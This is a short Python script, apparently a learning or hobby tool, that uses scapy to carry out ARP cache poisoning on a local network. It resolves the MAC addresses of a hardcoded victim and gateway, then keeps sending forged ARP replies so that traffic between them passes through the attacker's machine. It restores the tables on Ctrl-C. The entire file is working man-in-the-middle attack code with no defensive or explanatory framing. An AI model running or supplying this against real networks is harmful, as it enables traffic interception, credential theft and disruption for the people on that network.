import scapy.all as scapy
from time import sleep

def get_mac(ip):
	answered, unanswered = scapy.srp((scapy.Ether(dst='ff:ff:ff:ff:ff:ff')/scapy.ARP(pdst=ip)),timeout=2,verbose=False)
	print("[+] Found MAC",answered[0][1][scapy.ARP].hwsrc,"for IP",ip)
	return answered[0][1][scapy.ARP].hwsrc

def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
	victim_packet = scapy.ARP(hwdst=victim_mac,pdst=victim_ip,psrc=gateway_ip,hwsrc=gateway_mac,op=2)
	gateway_packet = scapy.ARP(hwdst=gateway_mac,pdst=gateway_ip,psrc=victim_ip,hwsrc=victim_mac,op=2)
	
	scapy.send(victim_packet,verbose=False)
	scapy.send(gateway_packet,verbose=False)

def poison(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac):
	victim_packet = scapy.ARP(hwdst=victim_mac,pdst=victim_ip,psrc=gateway_ip,hwsrc=attacker_mac,op=2)
	gateway_packet = scapy.ARP(hwdst=gateway_mac,pdst=gateway_ip,psrc=victim_ip,hwsrc=attacker_mac,op=2)
	while True:
		scapy.send(victim_packet,verbose=False)
		scapy.send(gateway_packet,verbose=False)
		print("[+] Sent 2 ARP packets.")
		sleep(1)


if __name__ == "__main__":

	victim_ip = '192.168.1.91'
	gateway_ip = '192.168.1.76'
	attacker_mac = '11:22:33:44:55:66'
	try:
		victim_mac = get_mac(victim_ip)
		gateway_mac = get_mac(gateway_ip)
		poison(victim_ip,victim_mac,gateway_ip,gateway_mac,attacker_mac)
	except KeyboardInterrupt:
		print("[+] Detected keyboard interrupt, restoring..")
		restore(victim_ip,victim_mac,gateway_ip,gateway_mac)
		print("[+] Goodbye!")
		exit(0)

